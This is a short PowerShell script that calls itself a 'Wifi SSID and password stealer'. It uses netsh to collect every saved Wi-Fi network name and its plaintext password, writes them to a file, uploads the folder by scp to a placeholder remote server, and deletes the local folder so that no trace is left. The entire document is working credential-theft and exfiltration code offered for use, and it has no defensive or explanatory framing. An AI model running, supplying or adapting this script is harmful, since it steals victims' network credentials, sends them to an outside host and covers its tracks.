# Wifi SSID and password stealer
# Sends out saved Wifi networks and the password if it is available

# Create directory to hold contents
$folder = "C:\wifiii"
mkdir $folder
cd $folder

# Define remote server details
$remoteServer = "your.remote.server" # Replace with your remote server address
$remoteUser = "username" # Replace with your remote server username
$remotePath = "/path/to/remote/directory" # Replace with the path on the remote server where you want to save the folder

$networks = netsh wlan show profiles
$begin = [array]::indexof($networks, "User profiles") + 2
$end = $networks.Length - 2
$names = @()
$result = ""

# Get an array of all saved Wifi network names
for($i = $begin; $i -le $end; $i++)
{
    $names += $networks[$i].substring($networks[$i].IndexOf(': ') + 2)
}

# Loop through all names and get the profile of each network
foreach($network in $names)
{
    $profile = netsh wlan show profile name=$network key=clear
    $name = ""
    $pass = ""
    $combo = ""
    # Loop through the lines in the profile and look for the SSID and password
    foreach($line in $profile)
    {
        if($line.IndexOf('Key Content') -ne -1)
        {
            $pass = $line.substring($line.IndexOf(': ') + 2)
        }
        elseif($line.IndexOf('SSID name') -ne -1)
        {
            $name = $line.substring($line.IndexOf(':') + 2).Trim('"')
        }
    }
    # If no password is available, set it to "Not Available"
    if($pass -eq "")
    {
        $pass = "Not Available"
    }
    # Add SSID and password combo to result
    $combo = $name + " - " + $pass + "`n"
    $result += $combo
}

# Create output file with all the info
Out-File wifi.txt -Append -InputObject $result
$file = Join-Path -Path $PWD -ChildPath "wifi.txt"

# Send the folder via SCP
scp -r ${folder} ${remoteUser}@${remoteServer}:${remotePath}

# Clean up any trace
cd ..
rmdir wifiii -Recurse
EXIT
